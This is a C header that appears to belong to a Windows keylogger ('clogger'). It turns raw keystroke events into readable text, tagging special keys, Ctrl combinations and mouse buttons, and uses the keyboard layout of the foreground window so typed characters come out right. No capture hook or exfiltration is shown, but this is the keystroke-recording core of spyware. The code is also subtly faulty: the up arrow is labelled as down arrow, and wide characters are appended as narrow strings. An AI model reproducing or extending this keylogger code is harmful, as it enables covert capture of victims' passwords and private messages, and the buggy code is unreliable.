#ifndef CLOGGER_KEY_H
#define CLOGGER_KEY_H


#include <windows.h>
#include "common.h"


#define H_KEY_SIZE (32 * CHARSZ)


HKL GetLang();
VOID GetKeyData(PCHAR buffer, UINT keyState, USHORT MakeCode, USHORT Flags, USHORT VKey, UINT Message, ULONG ExtraInfo);
VOID HandleInput(PCHAR buffer, UINT keyState, USHORT MakeCode, USHORT VKey);


HKL GetLang()
{
    HWND foregroundWindow = GetForegroundWindow();
    DWORD dwThread = GetWindowThreadProcessId(foregroundWindow , 0);
    HKL lang = GetKeyboardLayout(dwThread);
    return lang;
}

VOID GetKeyData(PCHAR buffer, UINT keyState, USHORT MakeCode, USHORT Flags, USHORT VKey, UINT Message, ULONG ExtraInfo)
{
    memset(buffer, 0, H_KEY_SIZE);
    HandleInput(buffer, keyState, MakeCode, VKey);
}

VOID HandleInput(PCHAR buffer, UINT keyState, USHORT MakeCode, USHORT VKey)
{
    switch(VKey)
    {
        case VK_LBUTTON:
            strcat_s(buffer, H_KEY_SIZE, "[L MOUSE BUTTON]");
            break;
        case VK_RBUTTON:
            strcat_s(buffer, H_KEY_SIZE, "[R MOUSE BUTTON]");
            break;
        case VK_CANCEL:
            strcat_s(buffer, H_KEY_SIZE, "[CONSOLE-BREAK PROC]");
            break;
        case VK_MBUTTON:
            strcat_s(buffer, H_KEY_SIZE, "[MOUSE MID BUTTON]");
            break;
        case VK_XBUTTON1:
            strcat_s(buffer, H_KEY_SIZE, "[X1 MOUSE BUTTON]");
            break;
        case VK_XBUTTON2:
            strcat_s(buffer, H_KEY_SIZE, "[X2 MOUSE BUTTON]");
            break;
        case VK_BACK:
            strcat_s(buffer, H_KEY_SIZE, "[BKSPACE]");
            break;
        case VK_TAB:
            strcat_s(buffer, H_KEY_SIZE, "[TAB]");
            break;
        case VK_CLEAR:
            strcat_s(buffer, H_KEY_SIZE, "[CLEAR]");
            break;
        case VK_RETURN:
            strcat_s(buffer, H_KEY_SIZE, "[ENTER]");
            break;
        case VK_SHIFT:
            strcat_s(buffer, H_KEY_SIZE, "[SHIFT]");
            break;
        case VK_CONTROL:
            strcat_s(buffer, H_KEY_SIZE, "[CTRL]");
            break;
        case VK_MENU:
            strcat_s(buffer, H_KEY_SIZE, "[ALT]");
            break;
        case VK_PAUSE:
            strcat_s(buffer, H_KEY_SIZE, "[PAUSE]");
            break;
        case VK_CAPITAL:
            strcat_s(buffer, H_KEY_SIZE, "[CAPSLOCK]");
            break;
        case VK_KANA:
            strcat_s(buffer, H_KEY_SIZE, "[IME KANA MODE]");
            break;
        case 0x16: // VK_IME_ON undeclared?
            strcat_s(buffer, H_KEY_SIZE, "[IME ON]");
            break;
        case VK_JUNJA:
            strcat_s(buffer, H_KEY_SIZE, "[IME JUNJA MODE]");
            break;
        case VK_FINAL:
            strcat_s(buffer, H_KEY_SIZE, "[IME FINAL MODE]");
            break;
        case VK_KANJI:
            strcat_s(buffer, H_KEY_SIZE, "[IME KANJI MODE]");
            break;
        case 0x1A: // VK_IME_OFF undeclared?
            strcat_s(buffer, H_KEY_SIZE, "[IME OFF]");
            break;
        case VK_ESCAPE:
            strcat_s(buffer, H_KEY_SIZE, "[ESC]");
            break;
        case VK_CONVERT:
            strcat_s(buffer, H_KEY_SIZE, "[IME CONVERT]");
            break;
        case VK_NONCONVERT:
            strcat_s(buffer, H_KEY_SIZE, "[IME NONCONVERT]");
            break;
        case VK_ACCEPT:
            strcat_s(buffer, H_KEY_SIZE, "[IME ACCEPT]");
            break;
        case VK_MODECHANGE:
            strcat_s(buffer, H_KEY_SIZE, "[IME MODECHANGE]");
            break;
        case VK_SPACE:
            strcat_s(buffer, H_KEY_SIZE, "[SPACE]");
            break;
        case VK_PRIOR:
            strcat_s(buffer, H_KEY_SIZE, "[PAGE UP]");
            break;
        case VK_NEXT:
            strcat_s(buffer, H_KEY_SIZE, "[PAGE DOWN]");
            break;
        case VK_END:
            strcat_s(buffer, H_KEY_SIZE, "[END]");
            break;
        case VK_HOME:
            strcat_s(buffer, H_KEY_SIZE, "[HOME]");
            break;
        case VK_LEFT:
            strcat_s(buffer, H_KEY_SIZE, "[LEFT ARROW]");
            break;
        case VK_UP:
            strcat_s(buffer, H_KEY_SIZE, "[DOWN ARROW]");
            break;
        case VK_RIGHT:
            strcat_s(buffer, H_KEY_SIZE, "[RIGHT ARROW]");
            break;
        case VK_DOWN:
            strcat_s(buffer, H_KEY_SIZE, "[DOWN ARROW]");
            break;
        case VK_SELECT:
            strcat_s(buffer, H_KEY_SIZE, "[SELECT]");
            break;
        case VK_PRINT:
            strcat_s(buffer, H_KEY_SIZE, "[PRINT]");
            break;
        case VK_EXECUTE:
            strcat_s(buffer, H_KEY_SIZE, "[EXECUTE]");
            break;
        case VK_SNAPSHOT:
            strcat_s(buffer, H_KEY_SIZE, "[PRINT SCREEN]");
            break;
        case VK_INSERT:
            strcat_s(buffer, H_KEY_SIZE, "[INSERT]");
            break;
        case VK_DELETE:
            strcat_s(buffer, H_KEY_SIZE, "[DELETE]");
            break;
        case VK_HELP:
            strcat_s(buffer, H_KEY_SIZE, "[HELP]");
            break;
        case VK_LWIN:
            strcat_s(buffer, H_KEY_SIZE, "[LEFT WINDOWS]");
            break;
        case VK_RWIN:
            strcat_s(buffer, H_KEY_SIZE, "[RIGHT WINDOWS]");
            break;
        case VK_APPS:
            strcat_s(buffer, H_KEY_SIZE, "[APP]");
            break;
        case VK_SLEEP:
            strcat_s(buffer, H_KEY_SIZE, "[SLEEP]");
            break;
        case VK_NUMPAD0:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD0]");
            break;
        case VK_NUMPAD1:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD1]");
            break;
        case VK_NUMPAD2:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD2]");
            break;
        case VK_NUMPAD3:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD3]");
            break;
        case VK_NUMPAD4:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD4]");
            break;
        case VK_NUMPAD5:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD5]");
            break;
        case VK_NUMPAD6:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD6]");
            break;
        case VK_NUMPAD7:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD7]");
            break;
        case VK_NUMPAD8:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD8]");
            break;
        case VK_NUMPAD9:
            strcat_s(buffer, H_KEY_SIZE, "[NUMPAD9]");
            break;
        case VK_MULTIPLY:
            strcat_s(buffer, H_KEY_SIZE, "MULTIPLY");
            break;
        case VK_ADD:
            strcat_s(buffer, H_KEY_SIZE, "[ADD]");
            break;
        case VK_SEPARATOR:
            strcat_s(buffer, H_KEY_SIZE, "[SEPARATOR]");
            break;
        case VK_SUBTRACT:
            strcat_s(buffer, H_KEY_SIZE, "[SUBTRACT]");
            break;
        case VK_DECIMAL:
            strcat_s(buffer, H_KEY_SIZE, "[DECIMAL]");
            break;
        case VK_DIVIDE:
            strcat_s(buffer, H_KEY_SIZE, "[DIVIDE]");
            break;
        case VK_F1:
            strcat_s(buffer, H_KEY_SIZE, "[F1]");
            break;
        case VK_F2:
            strcat_s(buffer, H_KEY_SIZE, "[F2]");
            break;
        case VK_F3:
            strcat_s(buffer, H_KEY_SIZE, "[F3]");
            break;
        case VK_F4:
            strcat_s(buffer, H_KEY_SIZE, "[F4]");
            break;
        case VK_F5:
            strcat_s(buffer, H_KEY_SIZE, "[F5]");
            break;
        case VK_F6:
            strcat_s(buffer, H_KEY_SIZE, "[F6]");
            break;
        case VK_F7:
            strcat_s(buffer, H_KEY_SIZE, "[F7]");
            break;
        case VK_F8:
            strcat_s(buffer, H_KEY_SIZE, "[F8]");
            break;
        case VK_F9:
            strcat_s(buffer, H_KEY_SIZE, "[F9]");
            break;
        case VK_F10:
            strcat_s(buffer, H_KEY_SIZE, "[F10]");
            break;
        case VK_F11:
            strcat_s(buffer, H_KEY_SIZE, "[F11]");
            break;
        case VK_F12:
            strcat_s(buffer, H_KEY_SIZE, "[F12]");
            break;
        case VK_F13:
            strcat_s(buffer, H_KEY_SIZE, "[F13]");
            break;
        case VK_F14:
            strcat_s(buffer, H_KEY_SIZE, "[F14]");
            break;
        case VK_F15:
            strcat_s(buffer, H_KEY_SIZE, "[F15]");
            break;
        case VK_F16:
            strcat_s(buffer, H_KEY_SIZE, "[F16]");
            break;
        case VK_F17:
            strcat_s(buffer, H_KEY_SIZE, "[F17]");
            break;
        case VK_F18:
            strcat_s(buffer, H_KEY_SIZE, "[F18]");
            break;
        case VK_F19:
            strcat_s(buffer, H_KEY_SIZE, "[F19]");
            break;
        case VK_F20:
            strcat_s(buffer, H_KEY_SIZE, "[F20]");
            break;
        case VK_F21:
            strcat_s(buffer, H_KEY_SIZE, "[F21]");
            break;
        case VK_F22:
            strcat_s(buffer, H_KEY_SIZE, "[F22]");
            break;
        case VK_F23:
            strcat_s(buffer, H_KEY_SIZE, "[F23]");
            break;
        case VK_F24:
            strcat_s(buffer, H_KEY_SIZE, "[F24]");
            break;
        case VK_NUMLOCK:
            strcat_s(buffer, H_KEY_SIZE, "[NUMLOCK]");
            break;
        case VK_SCROLL:
            strcat_s(buffer, H_KEY_SIZE, "[SCROLL LOCK]");
            break;
        case VK_LSHIFT:
            strcat_s(buffer, H_KEY_SIZE, "[L SHIFT]");
            break;
         case VK_RSHIFT:
            strcat_s(buffer, H_KEY_SIZE, "[R SHIFT]");
            break;
        case VK_LCONTROL:
            strcat_s(buffer, H_KEY_SIZE, "[L CONTROL]");
            break;
        case VK_RCONTROL:
            strcat_s(buffer, H_KEY_SIZE, "[R CONTROL]");
            break;
        case VK_LMENU:
            strcat_s(buffer, H_KEY_SIZE, "[L ALT]");
            break;
        case VK_RMENU:
            strcat_s(buffer, H_KEY_SIZE, "[R ALT]");
            break;
        case VK_BROWSER_BACK:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER BACK]");
            break;
        case VK_BROWSER_FORWARD:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER FORWARD]");
            break;
        case VK_BROWSER_REFRESH:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER REFRESH]");
            break;
        case VK_BROWSER_STOP:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER STOP]");
            break;
        case VK_BROWSER_SEARCH:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER SEARCH]");
            break;
        case VK_BROWSER_FAVORITES:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER FAVORITES]");
            break;
        case VK_BROWSER_HOME:
            strcat_s(buffer, H_KEY_SIZE, "[BROWSER HOME]");
            break;
        case VK_VOLUME_MUTE:
            strcat_s(buffer, H_KEY_SIZE, "[VOLUME MUTE]");
            break;
        case VK_VOLUME_DOWN:
            strcat_s(buffer, H_KEY_SIZE, "[VOLUME DOWN]");
            break;
        case VK_VOLUME_UP:
            strcat_s(buffer, H_KEY_SIZE, "[VOLUME UP]");
            break;
        case VK_MEDIA_NEXT_TRACK:
            strcat_s(buffer, H_KEY_SIZE, "[MEDIA NEXT TRACK]");
            break;
        case VK_MEDIA_PREV_TRACK:
            strcat_s(buffer, H_KEY_SIZE, "[MEDIA PREV TRACK]");
            break;
        case VK_MEDIA_STOP:
            strcat_s(buffer, H_KEY_SIZE, "[MEDIA STOP]");
            break;
        case VK_MEDIA_PLAY_PAUSE:
            strcat_s(buffer, H_KEY_SIZE, "[MEDIA PLAY/PAUSE]");
            break;
        case VK_LAUNCH_MAIL:
            strcat_s(buffer, H_KEY_SIZE, "[MEDIA LAUNCH MAIL]");
            break;
        case VK_LAUNCH_MEDIA_SELECT:
            strcat_s(buffer, H_KEY_SIZE, "[MEDIA MEDIA SELECT]");
            break;
        case VK_LAUNCH_APP1:
            strcat_s(buffer, H_KEY_SIZE, "[LAUNCH APP1]");
            break;
        case VK_LAUNCH_APP2:
            strcat_s(buffer, H_KEY_SIZE, "[LAUNCH APP2]");
            break;
        case VK_PROCESSKEY:
            strcat_s(buffer, H_KEY_SIZE, "[PROCESS KEY]");
            break;
        case VK_PACKET:
            strcat_s(buffer, H_KEY_SIZE, "[PACKET]");
            break;
        case VK_ATTN:
            strcat_s(buffer, H_KEY_SIZE, "[ATTN]");
            break;
        case VK_CRSEL:
            strcat_s(buffer, H_KEY_SIZE, "[CRSEL]");
            break;
        case VK_EXSEL:
            strcat_s(buffer, H_KEY_SIZE, "[EXSEL]");
            break;
        case VK_EREOF:
            strcat_s(buffer, H_KEY_SIZE, "[EREOF]");
            break;
        case VK_PLAY:
            strcat_s(buffer, H_KEY_SIZE, "[PLAY]");
            break;
        case VK_ZOOM:
            strcat_s(buffer, H_KEY_SIZE, "[ZOOM]");
            break;
        case VK_NONAME:
            strcat_s(buffer, H_KEY_SIZE, "[NONAME]");
            break;
        case VK_PA1:
            strcat_s(buffer, H_KEY_SIZE, "[PA1]");
            break;
        case VK_OEM_CLEAR:
            strcat_s(buffer, H_KEY_SIZE, "[OEM CLEAR]");
            break;
        case 0x07:
            strcat_s(buffer, H_KEY_SIZE, "[UNDEFINED]");
            break;
        case 0x0E:
        case 0x0F:
            strcat_s(buffer, H_KEY_SIZE, "[UNDEFINED]");
            break;
        case 0x3A:
        case 0x3B:
        case 0x3C:
        case 0x3D:
        case 0x3E:
        case 0x3F:
        case 0x40:
            strcat_s(buffer, H_KEY_SIZE, "[UNDEFINED]");
            break;
        case 0x5E:
            strcat_s(buffer, H_KEY_SIZE, "[RESERVED]");
            break;
        case 0x88:
        case 0x89:
        case 0x8A:
        case 0x8B:
        case 0x8C:
        case 0x8D:
        case 0x8E:
        case 0x8F:
            strcat_s(buffer, H_KEY_SIZE, "[UNASSIGNED]");
            break;
        case 0xB8:
        case 0xB9:
            strcat_s(buffer, H_KEY_SIZE, "[RESERVED]");
            break;
        case 0xD8:
        case 0xD9:
        case 0xDA:
            strcat_s(buffer, H_KEY_SIZE, "[UNASSIGNED]");
            break;
        case 0xC1:
        case 0xC2:
        case 0xC3:
        case 0xC4:
        case 0xC5:
        case 0xC6:
        case 0xC7:
        case 0xC8:
        case 0xC9:
        case 0xCA:
        case 0xCB:
        case 0xCC:
        case 0xCD:
        case 0xCE:
        case 0xCF:
        case 0xD0:
        case 0xD1:
        case 0xD2:
        case 0xD3:
        case 0xD4:
        case 0xD5:
        case 0xD6:
        case 0xD7:
            strcat_s(buffer, H_KEY_SIZE, "[RESERVED]");
            break;
        case 0xE0:
        case 0xE8:
            strcat_s(buffer, H_KEY_SIZE, "[RESERVED]");
            break;
        default:
        {
            HKL lang = GetLang();

            if ((keyState & STATE_CONTROL) && (keyState & STATE_ALT) == 0)
            {
                CHAR b[5];
                sprintf(b, "%c", MapVirtualKeyEx(VKey, MAPVK_VK_TO_CHAR, lang));
                strcat_s(buffer, H_KEY_SIZE, "[CTRL+");
                strcat_s(buffer, H_KEY_SIZE,  b);
                strcat_s(buffer, H_KEY_SIZE, "]");
                return;

            }

            if ((keyState & STATE_ALT) && (keyState & STATE_CONTROL) == 0)
                return;

            BYTE lpKeyState[256];
            if (GetKeyboardState(lpKeyState) == 0)
            {
                strcat_s(buffer, H_KEY_SIZE, "[E: Could not get key state]");
                return;
            }

            WCHAR pwszBuff[12];
            int res = ToUnicodeEx(VKey, MakeCode, lpKeyState, pwszBuff, 12, 0, lang);
            if (res == 0)
                return;

            strcat_s(buffer, H_KEY_SIZE, (CONST PCHAR)pwszBuff);

            break;
        }
    }
}


#endif

